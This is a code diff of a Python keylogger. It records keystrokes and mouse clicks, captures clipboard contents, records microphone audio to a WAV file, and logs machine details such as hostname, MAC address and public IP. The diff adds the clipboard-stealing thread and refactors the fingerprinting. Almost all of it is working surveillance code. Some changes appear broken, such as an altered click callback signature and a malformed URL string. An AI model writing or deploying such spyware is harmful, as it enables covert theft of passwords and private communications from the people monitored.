@@ -1,92 +1,108 @@
-from pynput import keyboard, mouse
-from pynput.keyboard import Key, Listener
+# -*- coding: utf-8 -*-
 import logging
-import platform,socket,re,uuid,json,logging,psutil
 import requests
 import threading
 import pyaudio
 import wave
+import win32clipboard
+import time
+
+from pynput import keyboard, mouse
+from pynput.keyboard import Key, Listener
+import platform, socket, re, uuid, json, psutil
 
 
 LOG_FILE = "keylogfile.txt"
+CLIPBOARD = "clipboard.txt"
+CHUNK = 4096
+FORMAT = pyaudio.paInt32
+CHANNELS = 2
+RATE = 48000
+WAVE_OUTPUT_FILENAME = "output.wav"
 
-# Paramètres d'enregistrement audio
-CHUNK = 4096  # Nombre de frames par buffer
-FORMAT = pyaudio.paInt32  # Format d'encodage audio
-CHANNELS = 2  # Nombre de canaux
-RATE = 48000  # Fréquence d'échantillonnage (Hz)
-WAVE_OUTPUT_FILENAME = "output.wav"  # Nom du fichier de sortie
-
-# Initialiser PyAudio
 audio = pyaudio.PyAudio()
-
-# Signal the audio thread to stop
 stop_audio_thread = threading.Event()
 
-
 def setup_logging():
-    """Set up logging."""
     logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
 
+def get_system_info():
+    info = {}
+    try:
+        response = requests.get('\n https://ipinfo.io/ip')
+        info['Public IP Address'] = response.text.strip()
+    except requests.RequestException as e:
+        info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
+    
+    info['System'] = f"{platform.system()} {platform.version()}"
+    info['Architecture'] = platform.machine()
+    info['Hostname'] = socket.gethostname()
+    info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
+    info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    info['Processor'] = platform.processor()
+    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB"
+
+    return info
 
 def log_system_info():
-    """Set up logging and retrieve system information."""
-    with open(LOG_FILE, "w") as file:
-        try:
-            response = requests.get('https://ipinfo.io/ip')
-            Public_adress = response.text.strip()
-        except requests.RequestException as e:
-            file.write("Unable to get the Public IP Address\n")
-        
-        file.write("OS Information :\n")
-        file.write(f"System: {platform.system()} {platform.version()}\n")
-        file.write(f"Architecture: {platform.machine()}\n")
-        file.write(f"Hostname: {socket.gethostname()}\n")
-        file.write(f"Public IP Address: {Public_adress}\n")
-        file.write(f"Private IP Address: {socket.gethostbyname(socket.gethostname())}\n")
-        file.write(f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n")
-        file.write(f"Processor: {platform.processor()}\n")
-        file.write(f"RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB\n")
-        file.write("\n")
-        file.write("LOGS :\n")
-        file.write("[Date Hour - 'Key' or 'Mouse Action']:\n")
-
-
+    info = get_system_info()
+    for key, value in info.items():
+        logging.info(f"{key}: {value}")
+    logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")
 
 def start_audio_recording():
-    """Start audio recording."""
-    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+    try:
+        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(audio.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
 
-    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
-    wf.setnchannels(CHANNELS)
-    wf.setsampwidth(audio.get_sample_size(FORMAT))
-    wf.setframerate(RATE)
+            print("Audio recording started. Press 'Esc' to stop.")
+            while not stop_audio_thread.is_set():
+                data = stream.read(CHUNK)
+                wf.writeframes(data)
+        
+        stream.stop_stream()
+        stream.close()
+    except Exception as e:
+        logging.error(f"Error occurred while recording audio: {e}")
+    finally:
+        audio.terminate()
 
-    print("Audio recording started. Press 'Esc' to stop.")
-    while not stop_audio_thread.is_set():
-        data = stream.read(CHUNK)
-        wf.writeframes(data)
+def clipboard():
+    previous_clipboard_data = ""  # Store the previous clipboard content
+    
+    with open(CLIPBOARD, "a") as file:
+        try:
+            while not stop_audio_thread.is_set():
+                win32clipboard.OpenClipboard()
+                pasted_data = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
 
-    stream.stop_stream()
-    stream.close()
-    audio.terminate()
-    wf.close()
+                # Check if clipboard content has changed
+                if pasted_data != previous_clipboard_data:
+                    file.write("Clipboard Data : \n")
+                    file.write(str(pasted_data) + "\n")
+                    file.write("\n")
+                    previous_clipboard_data = pasted_data
+                
+                # Add a small delay to avoid high CPU usage
+                time.sleep(1)
+        except Exception as e:
+            file.write("\n Clipboard could not be copied: " + str(e) + "\n")
 
 
 def on_press(key):
-    """Callback for key press event."""
     logging.info(f"[Key Pressed] - {key}")
 
-
 def on_release(key):
-    """Callback for key release event."""
     if key == Key.esc:
         print("Stopping the script.")
         stop_audio_thread.set()
         return False
 
-def on_click(x, y, button, pressed):
-    """Callback for mouse click event."""
+def on_click(button, pressed):
     if pressed:
         if button == mouse.Button.left:
             logging.info('[Mouse Click] - Left Click')
@@ -96,24 +112,30 @@ def on_click(x, y, button, pressed):
             logging.info('[Mouse Click] - Middle Click')
 
 def main():
-    """Main function to set up listeners and start logging."""
-    setup_logging()
-    log_system_info()
+    try:
+        setup_logging()
+        log_system_info()
 
-    # Start the audio recording thread
-    audio_thread = threading.Thread(target=start_audio_recording)
-    audio_thread.start()
+        clipboard_thread = threading.Thread(target=clipboard)
+        audio_thread = threading.Thread(target=start_audio_recording)
 
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
-        print("Script started. Press 'Esc' to stop.")
-        key_listener.join()
-        mouse_listener.stop()
-        audio_thread.join()  # Wait for the audio thread to finish
+        # Start threads
+        clipboard_thread.start()
+        audio_thread.start()
+
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
+            print("Script started. Press 'Esc' to stop.")
+            key_listener.join()
+            mouse_listener.stop()
+
+    except Exception as e:
+        logging.exception(f"An error occurred: {str(e)}")
+    finally:
+        # Ensure audio is terminated and threads are joined
+        stop_audio_thread.set()
+        audio_thread.join()
+        clipboard_thread.join()
+
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
